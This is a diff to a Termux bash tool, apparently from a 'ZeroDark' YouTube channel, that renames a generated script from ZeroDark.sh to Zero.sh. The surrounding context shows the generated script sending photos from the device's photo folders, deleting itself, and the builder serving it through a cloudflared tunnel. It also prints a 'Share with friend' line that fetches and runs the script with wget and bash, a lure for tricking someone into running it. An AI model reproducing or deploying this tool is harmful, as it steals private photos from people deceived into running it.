@@ -15,7 +15,7 @@ NC='\033[0m' # No Color
 rm cloudflared.log
 CONFIG="$HOME/.zerodark_config_atomic"
 HOST_DIR="$HOME/ZeroDarkHost"
-SCRIPT="$HOST_DIR/ZeroDark.sh"
+SCRIPT="$HOST_DIR/Zero.sh"
 LOG_FILE="$HOME/cloudflared.log"
 YOUTUBE_CHANNEL="https://youtube.com/@zerodarknexus"
 
@@ -73,7 +73,7 @@ for ((i=1; i<=count; i++)); do
 done
 
 # ------------------ Create ZeroDark.sh ------------------
-echo -e "${CYAN}📜 Generating ZeroDark.sh script...${NC}"
+echo -e "${CYAN}📜 Generating Zero.sh script...${NC}"
 {
 cat <<EOF
 #!/data/data/com.termux/files/usr/bin/bash
@@ -161,7 +161,7 @@ for DIR in "${PHOTO_DIRS[@]}"; do
 done
 
 echo -e "\n${GREEN}✅ Successfully Total photos sent: $total${NC}"
-rm ZeroDark.sh
+rm Zero.sh
 termux-open-url https://youtube.com/@zerodarknexus
 EOF
 } > "$SCRIPT"
@@ -216,10 +216,10 @@ fi
 
 # ------------------ Display Link ------------------
 echo -e "\n${GREEN}✅ Public URL:${NC}"
-echo -e "${WHITE}$LINK/ZeroDark.sh${NC}"
+echo -e "${WHITE}$LINK/Zero.sh${NC}"
 
 echo -e "\n${GREEN}📋 Share with friend:${NC}"
-echo -e "${CYAN}wget -q $LINK/ZeroDark.sh && bash ZeroDark.sh${NC}"
+echo -e "${CYAN}wget -q $LINK/Zero.sh && bash Zero.sh${NC}"
 
 # ------------------ Promotion ------------------
 echo -e "\n${YELLOW}📺 Subscribe our channel:${NC}"
